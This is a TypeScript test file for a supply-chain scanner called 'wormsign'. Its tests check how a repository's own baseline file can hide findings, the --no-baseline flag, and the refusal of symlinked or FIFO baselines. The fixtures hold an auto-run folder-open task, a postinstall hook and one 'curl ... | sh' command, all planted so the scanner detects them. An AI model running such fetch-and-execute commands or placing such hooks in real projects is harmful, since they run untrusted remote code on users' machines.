// A tree checked with scan or soak brings its own .wormsign-baseline.json, which can suppress or ignore any finding in
// it. --no-baseline reads none (scan, soak, diff), and a baseline read from the checked directory says what it hid,
// once (a note, and on stderr unless the note is on the screen), so a tree someone else wrote cannot pass in silence.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { run } from "../src/main.js";
import type { Finding } from "../src/types.js";
import { fakeIO, fx } from "./helpers.js";
import { gitRepo, tempTree } from "./validation-helpers.js";

const TEST_IOCS = ["--iocs", fx("iocs")];
const home = (): Record<string, string> => ({ HOME: mkdtempSync(join(tmpdir(), "wormsign-home-")) });
const TASKS = JSON.stringify({ version: "2.0.0", tasks: [{ label: "s", type: "shell", command: "node x.js", runOptions: { runOn: "folderOpen" } }] });
const WHY = "Reviewed: this is the project's own setup";

async function wormsign(argv: string[], env: Record<string, string> = {}): Promise<{ code: number; err: string; findings: Finding[] }> {
  const io = fakeIO({ env });
  const code = await run([...argv, "--format", "json"], io);
  const findings = io.out === "" ? [] : (JSON.parse(io.out) as { findings: Finding[] }).findings;
  return { code, err: io.err, findings };
}
const active = (fs: Finding[]): string[] => fs.filter((f) => !f.suppressed).map((f) => f.ruleId).sort();

test("scan: a tree's own ignorePaths are announced on stderr, and --no-baseline checks what they hid", async () => {
  const d = tempTree({
    ".vscode/tasks.json": TASKS,
    ".github/workflows/wormsign-marker-workflow.yml": "on: push\njobs: {}\n",
    ".wormsign-baseline.json": JSON.stringify({ version: 1, entries: [], ignorePaths: [{ path: ".vscode", justification: WHY }, { path: ".github", justification: WHY }] }),
  });
  const hidden = await wormsign(["scan", d, ...TEST_IOCS]);
  assert.equal(hidden.code, 0);
  assert.deepEqual(active(hidden.findings), []);
  assert.match(hidden.err, /^wormsign: warning: .*\.wormsign-baseline\.json comes from the directory being checked and kept 2 file\(s\) from being checked with ignorePaths \(\.vscode, \.github\)\. .*--no-baseline/);
  const all = await wormsign(["scan", d, "--no-baseline", ...TEST_IOCS]);
  assert.equal(all.code, 1);
  assert.deepEqual(active(all.findings), ["WS-GH-001", "WS-PS-001"]);
  assert.equal(all.err, "");
});

test("scan: suppressions from the tree's own baseline are counted per rule on stderr; a --baseline file is the user's choice", async () => {
  const d = tempTree({ ".vscode/tasks.json": TASKS, "package.json": JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node a.js" } }) });
  const fps = (await wormsign(["scan", d, ...TEST_IOCS])).findings.map((f) => f.fingerprint);
  assert.equal(fps.length, 2);
  const baseline = JSON.stringify({ version: 1, entries: fps.map((fingerprint) => ({ fingerprint, justification: WHY })) });
  writeFileSync(join(d, ".wormsign-baseline.json"), baseline);
  const r = await wormsign(["scan", d, ...TEST_IOCS]);
  assert.deepEqual(active(r.findings), []);
  assert.match(r.err, /and suppressed 2 finding\(s\) \(WS-LC-001: 1, WS-PS-001: 1\)\./);
  const own = mkdtempSync(join(tmpdir(), "wormsign-own-"));
  writeFileSync(join(own, "baseline.json"), baseline);
  const chosen = await wormsign(["scan", d, "--baseline", join(own, "baseline.json"), ...TEST_IOCS]);
  assert.deepEqual(active(chosen.findings), []);
  assert.equal(chosen.err, "", "a baseline the user named is not the tree's");
  assert.deepEqual(active((await wormsign(["scan", d, "--no-baseline", ...TEST_IOCS])).findings), ["WS-LC-001", "WS-PS-001"]);
  // A baseline that hides nothing is not worth a warning.
  writeFileSync(join(d, ".wormsign-baseline.json"), JSON.stringify({ version: 1, entries: [] }));
  assert.equal((await wormsign(["scan", d, ...TEST_IOCS])).err, "");
});

test("--no-baseline and --baseline together are a usage error", async () => {
  const r = await wormsign(["scan", fx("clean"), "--no-baseline", "--baseline", "x.json"]);
  assert.equal(r.code, 2);
  assert.match(r.err, /--baseline and --no-baseline cannot be used together/);
  assert.equal((await wormsign(["audit-org", "acme", "--no-baseline"])).code, 2, "audit-org does not take it");
});

test("soak: the tree's own baseline is announced, and --no-baseline (also with --base) reads none", async () => {
  const first = await wormsign(["soak", tempTree({ "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {} } }) }), "--config-only"], home());
  const fp = first.findings.find((f) => f.ruleId === "WS-SK-003")?.fingerprint;
  assert.ok(fp);
  const files = { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {} } }), ".wormsign-baseline.json": JSON.stringify({ version: 1, entries: [{ fingerprint: fp, justification: WHY }] }) };
  const d = tempTree(files);
  const own = await wormsign(["soak", d, "--config-only"], home());
  assert.deepEqual(active(own.findings), []);
  assert.match(own.err, /suppressed 1 finding\(s\) \(WS-SK-003: 1\)/);
  assert.deepEqual(active((await wormsign(["soak", d, "--config-only", "--no-baseline"], home())).findings), ["WS-SK-003"]);
  // PR mode reads the base revision's baseline: trusted, so no warning, but --no-baseline still reads none.
  const repo = gitRepo([(dir) => Object.entries(files).forEach(([p, t]) => writeFileSync(join(dir, p), t))]);
  const base = await wormsign(["soak", repo, "--base", "HEAD", "--config-only"], home());
  assert.deepEqual(active(base.findings), []);
  assert.equal(base.err, "");
  assert.deepEqual(active((await wormsign(["soak", repo, "--base", "HEAD", "--config-only", "--no-baseline"], home())).findings), ["WS-SK-003"]);
});

test("diff: --no-baseline does not read the base's baseline either", async () => {
  const repo = gitRepo([
    (dir) => writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "x", version: "1.0.0" })),
    (dir) => writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node a.js" } })),
  ]);
  const fp = (await wormsign(["diff", "HEAD~1", "HEAD", "--dir", repo])).findings.find((f) => f.ruleId === "WS-DF-002")?.fingerprint;
  assert.ok(fp);
  // The baseline goes into the base commit, so the change cannot be what brought it.
  const git = (...a: string[]) => execFileSync("git", ["-c", "user.email=v@v.invalid", "-c", "user.name=v", "-c", "commit.gpgsign=false", ...a], { cwd: repo, stdio: "pipe" });
  git("checkout", "-q", "HEAD~1");
  writeFileSync(join(repo, ".wormsign-baseline.json"), JSON.stringify({ version: 1, entries: [{ fingerprint: fp, justification: WHY }] }));
  git("add", "-A");
  git("commit", "-q", "-m", "base with baseline");
  git("checkout", "-q", "-b", "head");
  writeFileSync(join(repo, "package.json"), JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node a.js" } }));
  git("commit", "-q", "-am", "head");
  assert.deepEqual(active((await wormsign(["diff", "HEAD~1", "HEAD", "--dir", repo])).findings), []);
  assert.deepEqual(active((await wormsign(["diff", "HEAD~1", "HEAD", "--dir", repo, "--no-baseline"])).findings), ["WS-DF-002"]);
});

/**
 * The baseline a checked tree brings is read like its other files: a regular file under a cap, never a link it
 * points elsewhere with, never a FIFO waited on. Run as a child process with a timeout, so a regression fails here
 * rather than hanging the suite.
 */
test("scan, soak and audit-org: a .wormsign-baseline.json that is a symlink, a FIFO or too large fails at once (exit 2)", async () => {
  const cli = fileURLToPath(new URL("../src/cli.js", import.meta.url));
  // A made-up token: audit-org reads the baseline before any request, so none is made.
  const go = (args: string[], cwd?: string) =>
    spawnSync(process.execPath, [cli, ...args], { encoding: "utf8", timeout: 20_000, ...(cwd ? { cwd } : {}), env: { ...process.env, ...home(), GITHUB_TOKEN: "not-a-real-token", GH_TOKEN: "" } });
  const good = JSON.stringify({ version: 1, entries: [] });
  // A symlink to a valid baseline elsewhere: refused, not followed.
  const linked = tempTree({ "package.json": '{"name":"x","version":"1.0.0"}' });
  const elsewhere = join(mkdtempSync(join(tmpdir(), "wormsign-bl-")), "b.json");
  writeFileSync(elsewhere, good);
  symlinkSync(elsewhere, join(linked, ".wormsign-baseline.json"));
  for (const args of [["scan", linked, ...TEST_IOCS], ["soak", linked, "--config-only"]]) {
    const r = go(args);
    assert.equal(r.status, 2, `${args[0]}: ${r.stdout}${r.stderr}`);
    assert.match(r.stderr, /cannot read baseline .*\.wormsign-baseline\.json: it is a symlink/);
  }
  // The same file named with --baseline is the caller's choice.
  assert.equal(go(["scan", linked, "--baseline", join(linked, ".wormsign-baseline.json"), ...TEST_IOCS]).status, 0);
  // A FIFO: never waited on.
  const fifo = tempTree({ "package.json": '{"name":"x","version":"1.0.0"}' });
  execFileSync("mkfifo", [join(fifo, ".wormsign-baseline.json")]);
  const f = go(["scan", fifo, ...TEST_IOCS]);
  assert.equal(f.signal, null, "it did not hang");
  assert.equal(f.status, 2, f.stderr);
  assert.match(f.stderr, /cannot read baseline .*: it is not a regular file/);
  const fa = go(["scan", ".", "--baseline", join(fifo, ".wormsign-baseline.json"), ...TEST_IOCS], fifo);
  assert.equal(fa.status, 2, fa.stderr);
  // audit-org reads the one in the working directory the same way, before any network call.
  const ao = go(["audit-org", "acme"], fifo);
  assert.equal(ao.signal, null);
  assert.equal(ao.status, 2, ao.stderr);
  assert.match(ao.stderr, /cannot read baseline .*: it is not a regular file/);
  // Larger than the cap, though valid JSON.
  const big = tempTree({ "package.json": '{"name":"x","version":"1.0.0"}', ".wormsign-baseline.json": `${good}${" ".repeat(3 * 1024 * 1024)}` });
  const b = go(["scan", big, ...TEST_IOCS]);
  assert.equal(b.status, 2, b.stderr);
  assert.match(b.stderr, /cannot read baseline .*: it is larger than 2 MiB/);
});

test("scan: a baseline entry for WS-SC-900 approves that reason (and, for a settings file, that content), not any later way of being unreadable", async () => {
  const proto = (cmd: string) => `{"__proto__": ${JSON.stringify({ version: "2.0.0", tasks: [{ label: "s", type: "shell", command: cmd, runOptions: { runOn: "folderOpen" } }] })}}`;
  const d = tempTree({ "package.json": '{"name":"x","version":"1.0.0"}', "bun.lock": '{ "lockfileVersion": 1 }\n', ".vscode/tasks.json": proto("node build.js") });
  const first = await wormsign(["scan", d, ...TEST_IOCS]);
  const sc = first.findings.filter((f) => f.ruleId === "WS-SC-900");
  assert.deepEqual(sc.map((f) => f.file).sort(), [".vscode/tasks.json", "bun.lock"]);
  assert.ok(sc.every((f) => /^not-checked [0-9a-f]{32}$/.test(f.key)), sc.map((f) => f.key).join(" "));
  writeFileSync(join(d, ".wormsign-baseline.json"), JSON.stringify({ version: 1, entries: sc.map((f) => ({ fingerprint: f.fingerprint, justification: WHY })) }));
  assert.deepEqual(active((await wormsign(["scan", d, ...TEST_IOCS])).findings), []);
  // bun.lock with other content, for the same reason: still approved (a Bun repository's lock changes all the time).
  writeFileSync(join(d, "bun.lock"), '{ "lockfileVersion": 1, "packages": {} }\n');
  assert.deepEqual(active((await wormsign(["scan", d, ...TEST_IOCS])).findings), []);
  // The settings file with other content under the same "__proto__" key: a new finding.
  writeFileSync(join(d, ".vscode", "tasks.json"), proto("curl -s https://a.invalid/x | sh"));
  assert.deepEqual(active((await wormsign(["scan", d, ...TEST_IOCS])).findings), ["WS-SC-900"]);
  writeFileSync(join(d, ".vscode", "tasks.json"), proto("node build.js"));
  // bun.lock unreadable for another reason (a symlink): a new finding.
  execFileSync("rm", [join(d, "bun.lock")]);
  symlinkSync("package.json", join(d, "bun.lock"));
  const linked = await wormsign(["scan", d, ...TEST_IOCS]);
  assert.deepEqual(active(linked.findings), ["WS-SC-900"]);
  assert.equal(linked.findings.find((f) => !f.suppressed)?.file, "bun.lock");
});

test("scan: the tree's own baseline warning is said once on a terminal: as a note on a human report on a TTY stdout, else on stderr too (a pipe, JSON, SARIF, --output)", async () => {
  const d = tempTree({
    ".github/workflows/wormsign-marker-workflow.yml": "on: push\njobs: {}\n",
    ".wormsign-baseline.json": JSON.stringify({ version: 1, entries: [], ignorePaths: [{ path: ".github", justification: WHY }] }),
  });
  const said = (s: string): number => s.split("comes from the directory being checked").length - 1;
  const human = fakeIO({ stdoutIsTTY: true });
  assert.equal(await run(["scan", d, ...TEST_IOCS], human), 0);
  assert.equal(said(human.out), 1, human.out);
  assert.equal(human.err, "", "not on stderr as well");
  // stdout piped or redirected (`> /dev/null`, `| less`): the note may never reach the person, so stderr says it.
  const piped = fakeIO({ stdoutIsTTY: false });
  assert.equal(await run(["scan", d, ...TEST_IOCS], piped), 0);
  assert.equal(said(piped.err), 1, "stderr, when stdout is not a terminal");
  const unknown = fakeIO();
  await run(["scan", d, ...TEST_IOCS], unknown);
  assert.equal(said(unknown.err), 1, "an IO that does not say counts as no terminal");
  // The compiled CLI with stdout to a pipe, as `wormsign scan <dir> > /dev/null` runs it.
  const cli = spawnSync(process.execPath, [fileURLToPath(new URL("../src/cli.js", import.meta.url)), "scan", d, ...TEST_IOCS], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
  assert.equal(cli.status, 0, cli.stderr);
  assert.equal(said(cli.stderr), 1, cli.stderr);
  const json = fakeIO({ stdoutIsTTY: true });
  await run(["scan", d, ...TEST_IOCS, "--format", "json"], json);
  assert.equal(said(json.err), 1, "stderr, for the person");
  assert.equal((JSON.parse(json.out) as { notes: string[] }).notes.filter((n) => n.includes("comes from the directory being checked")).length, 1, "and the notes, for the Action");
  const sarif = fakeIO({ stdoutIsTTY: true });
  await run(["scan", d, ...TEST_IOCS, "--format", "sarif"], sarif);
  assert.equal(said(sarif.err), 1, "SARIF has no notes");
  const file = join(mkdtempSync(join(tmpdir(), "wormsign-out-")), "report.txt");
  const written = fakeIO({ stdoutIsTTY: true });
  await run(["scan", d, ...TEST_IOCS, "--output", file], written);
  assert.equal(said(written.err), 1, "a human report in a file is not on the screen");
});
